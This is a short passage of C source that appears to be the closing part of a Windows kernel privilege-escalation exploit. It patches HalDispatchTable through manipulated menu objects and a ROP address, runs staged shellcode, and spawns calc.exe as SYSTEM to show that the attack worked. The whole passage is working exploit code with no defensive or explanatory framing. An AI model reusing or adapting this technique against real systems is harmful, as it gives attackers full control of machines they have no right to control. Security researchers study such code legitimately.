
	// replace overlay 1 with new overlay and menu
	ReplaceObjects(&new_objs_lstr);

	// patch HalDispatchTable
	PatchDWORD(menu_handle, *(DWORD *)((BYTE *)&rop_addr + 4));
	RebuildMenu(new_objects, (PVOID)HalDispatchTable);
	PatchDWORD(menu_handle, *(DWORD *)(BYTE *)&rop_addr);

	// start payload (stage + shellcode)
	if (!RunPayload((ULONG_PTR)sc_addr)) {
		OutputDebugStringA("failed to run shellcode");
		return 0;
	}

	// run calc.exe as system
	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\calc.exe", procpath, MAX_PATH - 1);
	if (SpawnProc(procpath) != TRUE) {
		OutputDebugStringA("failed to spawn calc.exe");
		return 0;
	}
	
	// free previously instantiated objects
	CleanHeap(menu_handle);

	return 0;
}
